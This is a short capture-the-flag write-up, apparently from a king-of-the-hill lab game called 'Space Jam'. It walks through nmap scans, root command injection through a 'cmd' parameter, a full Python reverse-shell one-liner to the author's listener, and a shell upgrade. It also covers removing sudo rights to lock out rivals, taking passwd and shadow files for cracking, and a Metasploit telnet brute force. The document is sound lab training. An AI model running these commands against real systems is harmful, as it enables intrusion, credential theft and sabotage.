### Noah Newdorf's Space Jam summary
I started by running two nmap scans, one ‘fast’ scan with the `–f` flag for top 1,00 ports, and another full scan with `–p-` for all ports.  
`sudo nmap -f -sC -sV -T5 -oN fastscan -v 10.10.182.201`  
`sudo nmap -p- -v -sC -sV -T5 -oN fullscan 10.10.182.201`

Abbreviated output of the fast scan:
>Scanning 10.10.182.201 [1000 ports]  
>Discovered open port 80/tcp on 10.10.182.201  
>Discovered open port 23/tcp on 10.10.182.201  
>Discovered open port 22/tcp on 10.10.182.201  
>Discovered open port 3000/tcp on 10.10.182.201  
>Discovered open port 9999/tcp on 10.10.182.201  
>PORT STATE SERVICE VERSION  
>22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)  
>23/tcp open telnet Linux telnetd  
>80/tcp open http Apache httpd 2.4.18 ((Ubuntu))  
>| http-methods:  
>|_ Supported Methods: GET HEAD POST OPTIONS  
>|_http-server-header: Apache/2.4.18 (Ubuntu)  
>|_http-title: Michael Jordan  
>3000/tcp open http Node.js (Express middleware)  
>| http-methods:  
>|_ Supported Methods: GET HEAD POST OPTIONS  
>|_http-title: Site doesn't have a title (text/html; charset=utf-8).  
>9999/tcp open http Golang net/http server  

Taking a random port, I jumped to port 3000 in the browser which gave a very useful hint of ‘cmd parameter missing’.  
Testing the cmd parameter assuming it ran OS commands I did a test of `http://10.10.182.201:3000/?cmd=whoami` which said `root`
This seemed too easy but all evidence showed it really did run commands as root.  
Before creating my reverse shell I did a `http://10.10.182.201:3000/?cmd=echo unnoable > /root/king.txt` to get the king points started.  
Going over to pentestmonkey’s reverse shell cheat sheet I started a `nc –lvnp 12345` listener on my end and ran the python shell after checking `which python`.  
`http://10.10.182.201:3000/?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.2.5.16",12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`  
I then upgraded my shell with python and stty:  
`python -c 'import pty; pty.spawn("/bin/bash")'`  
`[ctrl + z]`  
`stty raw –echo`  
`fg`  
Making it harder for others to follow me to root I cleared out the sudo permissions which were a straight shot to root with both users having all sudo access with no password.
I tried adding a new user account but something was messing it up so I just left it and made sure not to lose my access.  
Doing some post exploitation I stole the passwd and shadow files to crack the passwords later. They are in a crackable form now by using the john unshadow tool
`sudo /usr/sbin/unshadow passwd shadow > unshadow.crack`.  
I looked around the machine but only found 2 flags, a duplicate user.txt for both bunny and Jordan, and
a root.txt.  
Rob had also gotten root and did some fuckery with the king.txt so it was impossible to add your name
to it. I tried searching the running processes with `ps –ef | grep king.txt` but couldn’t find the loop he said he was running.
I also attempted bruteforcing the telnet login, and trying an empty username/password.  
`msfconsole`  
`search telnet_login`  
`use 0`  
`options`  
`set RHOSTS 10.10.182.201`  
`set USERNAME spacejam`  
`set PASS_FILE /usr/share/wordlists/rockyou.txt`  
`run`  
But then it locked me out after like 3 tries :(  
There was also a pretty plain looking website on port 80. Running `gobuster` on that originally showed a
couple of directories including /flag/. I tried running it again on that directory but didn’t get anything. I
probably could have searched for php, html, or txt files with the `–x txt,html,php` gobuster flag but
there wasn’t a lot of time at this point.
